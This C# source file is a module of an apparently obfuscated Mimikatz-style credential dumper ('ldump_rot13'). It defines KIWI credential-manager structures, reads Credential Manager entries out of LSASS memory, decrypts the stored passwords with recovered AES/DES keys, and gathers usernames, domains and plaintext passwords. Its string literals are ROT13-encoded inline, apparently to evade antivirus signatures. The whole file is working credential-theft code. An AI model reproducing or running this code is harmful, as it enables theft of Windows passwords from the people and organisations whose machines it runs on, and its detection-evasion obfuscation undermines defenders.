//start
using System.Text;
using System.Linq;
using System;
﻿//

using ldump_rot13.Credential;
using ldump_rot13.Crypto;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static ldump_rot13.Win32.Natives;

namespace ldump_rot13.Module
{
    class CredMan
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_CREDMAN_LIST_ENTRY
        {
            public uint cbEncPassword;
            public IntPtr encPassword; //WSTR
            public uint unk0;
            public uint unk1;
            public IntPtr unk2;
            public IntPtr unk3;
            public IntPtr UserName; //WSTR
            public uint cbUserName;
            public IntPtr Flink; //KIWI_CREDMAN_LIST_ENTRY
            public IntPtr Blink; //KIWI_CREDMAN_LIST_ENTRY
            public Msv1.LIST_ENTRY unk4;
            public UNICODE_STRING type;
            public IntPtr unk5;
            public UNICODE_STRING server1;
            public IntPtr unk6;
            public IntPtr unk7;
            public IntPtr unk8;
            public IntPtr unk9;
            public IntPtr unk10;
            public UNICODE_STRING user;
            public uint unk11;
            public UNICODE_STRING server2;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_CREDMAN_SET_LIST_ENTRY
        {
            public IntPtr Flink; //KIWI_CREDMAN_SET_LIST_ENTRY
            public IntPtr Blink; //KIWI_CREDMAN_SET_LIST_ENTRY
            public uint unk0;
            public IntPtr list1; //KIWI_CREDMAN_LIST_STARTER
            public IntPtr list2; //KIWI_CREDMAN_LIST_STARTER
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_CREDMAN_LIST_STARTER
        {
            uint unk0;
            public IntPtr start; //KIWI_CREDMAN_LIST_ENTRY
        };

        public static int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            foreach (Logon logon in logonlist)
            {
                IntPtr credmanMem = logon.pCredentialManager;
                LUID luid = logon.LogonId;

                IntPtr llCurrent;
                int reference = 1;

                //Console.WriteLine("[*] Credman  CredmanListSet found at address {0:X} {1:X}", luid.LowPart, credmanMem.ToInt64());

                byte[] credmansetBytes = Utility.ReadFromLsass(ref hLsass, credmanMem, Marshal.SizeOf(typeof(KIWI_CREDMAN_SET_LIST_ENTRY)));

                IntPtr pList1 = new IntPtr(BitConverter.ToInt64(credmansetBytes, Utility.FieldOffset<KIWI_CREDMAN_SET_LIST_ENTRY>(new string("yvfg1".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));
                IntPtr refer = IntPtr.Add(pList1, Utility.FieldOffset<KIWI_CREDMAN_LIST_STARTER>(new string("fgneg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())));

                byte[] credmanstarterBytes = Utility.ReadFromLsass(ref hLsass, pList1, Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_STARTER)));

                IntPtr pStart = new IntPtr(BitConverter.ToInt64(credmanstarterBytes, Utility.FieldOffset<KIWI_CREDMAN_LIST_STARTER>(new string("fgneg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));

                if (pStart == IntPtr.Zero)
                    continue;

                llCurrent = pStart;

                if (llCurrent == refer)
                    continue;

                do
                {

                    byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Subtract(llCurrent, Utility.FieldOffset<KIWI_CREDMAN_LIST_ENTRY>(new string("Syvax".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) ), Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_ENTRY)));
                    KIWI_CREDMAN_LIST_ENTRY entry = Utility.ReadStruct<KIWI_CREDMAN_LIST_ENTRY>(entryBytes);

                    string username = Utility.ExtractUnicodeStringString(hLsass, entry.user);
                    string domain = Utility.ExtractUnicodeStringString(hLsass, entry.server1);

                    string passDecrypted = "";

                    byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.encPassword, entry.cbEncPassword);
                    byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                    if (msvDecryptedPasswordBytes != null && msvDecryptedPasswordBytes.Length > 0)
                    {
                        UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
                        try
                        {
                            passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                        }
                        catch (Exception)
                        {
                            passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
                        }
                    }

                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        Credential.CredMan credmanentry = new Credential.CredMan();
                        credmanentry.Reference = reference;
                        credmanentry.UserName = username;

                        if (!string.IsNullOrEmpty(domain))
                        {
                            credmanentry.DomainName = domain;
                        }
                        else
                        {
                            credmanentry.DomainName = new string("[AHYY]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                        }

                        if (!string.IsNullOrEmpty(passDecrypted))
                        {
                            credmanentry.Password = passDecrypted;

                        }
                        else
                        {
                            credmanentry.Password = new string("[AHYY]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                        }

                        Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.Credman = new List<Credential.CredMan>();
                            currentlogon.Credman.Add(credmanentry);
                            logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Credman == null)
                                currentlogon.Credman = new List<Credential.CredMan>();

                            currentlogon.Credman.Add(credmanentry);
                        }
                    }
                    reference++;
                    llCurrent = entry.Flink;
                } while (llCurrent != IntPtr.Zero && llCurrent != refer);
            }
            return 0;
        }
    }
}
